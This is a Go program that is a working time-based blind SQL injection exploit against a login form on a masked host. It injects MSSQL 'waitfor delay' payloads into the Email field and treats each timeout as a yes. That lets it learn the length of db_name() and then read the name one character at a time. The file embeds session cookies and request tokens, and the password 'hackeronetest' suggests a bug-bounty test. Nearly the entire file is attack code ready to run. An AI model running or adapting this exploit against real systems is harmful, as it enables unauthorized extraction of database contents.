package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func main() {
	Getinfo("db_name()")
}

func Requester(uurl string, data string, method string) bool {
	//proxyx ,_ := url.Parse( "http://127.0.0.1:8081")
	HTTPclient := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: time.Second * 5,
		Transport: &http.Transport{
			//Proxy: http.ProxyURL(proxyx),
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	client := HTTPclient
	req, _ := http.NewRequest(method, uurl, strings.NewReader(data))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Cookie", "AWSALB=oZx;AWSALBCORS=oTDN73ae4k7mmGHn8U6i+MVVOwwrSunAfiVn4JH6E4+sWyQ/d1nTn4PebNpAkbxE/vxh3z9b1jdXQmcXTFKZx;__RequestVerificationToken=DydZa9ZvRYOTTBQYclQOfnEe8hGKTJafS7GHRFcuSzpXY8Z4WnvHgT5uvvQcQhMK37HuxByKU4oz3iT0jBVsUsjAU9-PDEzKnTrcYrW41;ASP.NET_SessionId=grmc2sthga42jyfew5l2su")
	resp, err := client.Do(req)
	if resp != nil {
		io.Copy(ioutil.Discard, resp.Body)
		resp.Body.Close()
	}
	
	if err != nil {
		return true
	} else {
		return false
	}
}

func Getlen(s string) int {
	var i int
	for i = 0; i < 150; i++ {
		payload := fmt.Sprintf("Email=LSFajxJg';if%%20(len(%s)%%20=%%20%d)%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMUadmH4MRLG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&x=n", s, i)
		if Requester("https://**.**.com/", payload, "POST") {
			fmt.Println(s, "len is  ", i)
			return i
			time.Sleep(time.Second * 5)
			break
		}
	}
	return i
}

func Getinfo(s string) {
	fmt.Println("get " + s + "...")
	var info string
	num := Getlen(s)
	for i := 0; i < num; i++ {
		str := "abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_."
		for _, y := range str {
			payload := fmt.Sprintf("Email=LSFajxJg';if%%20(%s%%20like%%20'%s%s%%')%%20waitfor%%20delay%%20'0:0:6'%%20--&Password=hackeronetest&RememberMe=true&__RequestVerificationToken=KfsgMzPxLWMadmH4MRLFsG2VqzyBfWjFrGqWXEnWKS9yV7iRCIcm97JXozx0j4BAwWsuP7N9pr3ZVlGOr0sEAuZEkBjNAPoO8GruozItdM1&x=n", s, info, string(y))
			if Requester("https://**.**.com/", payload, "POST") {
				info = info + string(y)
				fmt.Println(s, "is", info)
				time.Sleep(time.Second * 5)
				break
			}
		}
	}
	fmt.Println(s, "=", info)
}
